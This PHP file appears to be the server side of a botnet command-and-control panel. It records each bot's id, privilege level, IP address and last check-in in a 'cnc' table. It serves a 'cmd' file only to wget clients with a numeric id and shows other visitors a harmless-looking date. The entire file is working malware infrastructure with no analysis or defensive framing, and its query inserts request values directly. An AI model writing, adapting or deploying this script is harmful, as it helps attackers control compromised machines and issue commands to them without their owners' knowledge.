<?php

$servername = "localhost";
$username = "";
$password = "";
$dbname = "";
$lastdate = date('d-m-Y H:i:s');
$lastip = $_SERVER['REMOTE_ADDR'];
$file = 'cmd';
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
$dcode = $_SERVER['QUERY_STRING']; 
$dcode = preg_replace("/[^a-zA-Z0-9@-]/", "-", $dcode);
$unid = strtok($dcode, '-');
$unid = preg_replace('/\D/', '', $unid);
$priv = substr(strrchr($dcode, "-"), 1);
$connect = new mysqli($servername, $username, $password, $dbname);
$query1 = "UPDATE cnc SET lastdate = '$lastdate', priv = '$priv', lastip = '$lastip' WHERE unid = '$unid'";

if ((strlen(strstr($agent, 'wget')) > 0) && (is_numeric($unid))) {
    readfile($file);
    $connect->query($query1);
    $connect->close();
} else {
    print gmdate("Y-m-d H:i:s");
}

?>
